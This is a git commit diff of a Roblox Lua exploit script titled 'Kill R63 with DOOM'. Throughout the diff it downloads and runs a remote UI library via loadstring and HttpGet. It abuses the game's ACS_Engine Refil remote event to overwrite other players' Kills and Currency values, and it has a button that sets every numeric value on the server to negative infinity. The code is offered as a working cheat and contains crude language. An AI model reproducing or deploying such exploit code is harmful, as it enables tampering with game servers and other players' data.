3c11af2db4b7d1b2bde05a694e0a43eead1defe3
RenRenxD <92799068+RenRenxD@users.noreply.github.com>
2022-08-20 16:18:27 +0200

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,44 +1,57 @@
-local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()
-local w = library:CreateWindow("Kill R63 with DOOM")
-local b = w:CreateFolder("MADE BY ren !#2925")
-
+local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/sol"))()
 local playertable = {}
 
-local function doshit()
-    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+for i,v in pairs(game:GetService("Players"):GetPlayers()) do
    if v~=game.Players.LocalPlayer then
        playertable[#playertable+1] = v.Name
    end
 end
+
+game.Players.PlayerAdded:Connect(function(player)
+   if player~=game.Players.LocalPlayer then
+       playertable[#playertable+1] = player.Name
+   end
+end)
+
+game.Players.PlayerRemoving:Connect(function(player)
+   if player~=game.Players.LocalPlayer then
+       playertable[#playertable-1] = player.Name
+   end
+end)
+
+local win = SolarisLib:New({
+  Name = "Kill R63 with DOOM made by ren !#2925",
+  FolderToSave = "SolarisLibStuff"
+})
+
+local tab = win:Tab("ALL THE GOOD SHIT")
+
+local sec = tab:Section("FUCK OTHER PLAYERS")
+
+local selectedPlayer
+
+local dropdown = sec:Dropdown("Select player", playertable,"","Dropdown", function(t)
+  print(t)
+  selectedPlayer = t
+end)
+
+sec:Button("fuck the server", function()
+for i,v in pairs(game:GetDescendants()) do
+if v:IsA("NumberValue") or v:IsA("IntValue") then
+game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(v, -math.huge)
 end
-
-doshit()
-
-game.Players.PlayerAdded:Connect(function()
-doshit()
-b:Refresh(playertable)
+end
 end)
 
-game.Players.PlayerRemoving:Connect(function()
-doshit()
-b:Refresh(playertable)
+sec:Button("Reset player list", function()
+dropdown:Refresh(playertable, true)
+dropdown:Set(selectedPlayer)
 end)
 
-local a
-
-b:Dropdown("Select Player",{table.unpack(playertable)},true,function(mob)
-    a = mob
-    print(a)
+sec:Textbox("Currency amount", false, function(Currency)
+    game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[selectedPlayer].leaderstats.Currency, Currency)
 end)
 
-b:Box("Kills amount","number",function(kills)
-    print(kills)
-    game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[a].leaderstats.Kills, kills/2)
+sec:Textbox("Kills amount", false, function(Kills)
+      game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[selectedPlayer].leaderstats.Kills, Kills)
 end)
-
-b:Box("Currency amount","number",function(money)
-    print(money)
-    game:GetService("ReplicatedStorage").ACS_Engine.Events.Refil:FireServer(game.Players[a].leaderstats.Currency, money/2)
-end)
-
-b:DestroyGui()
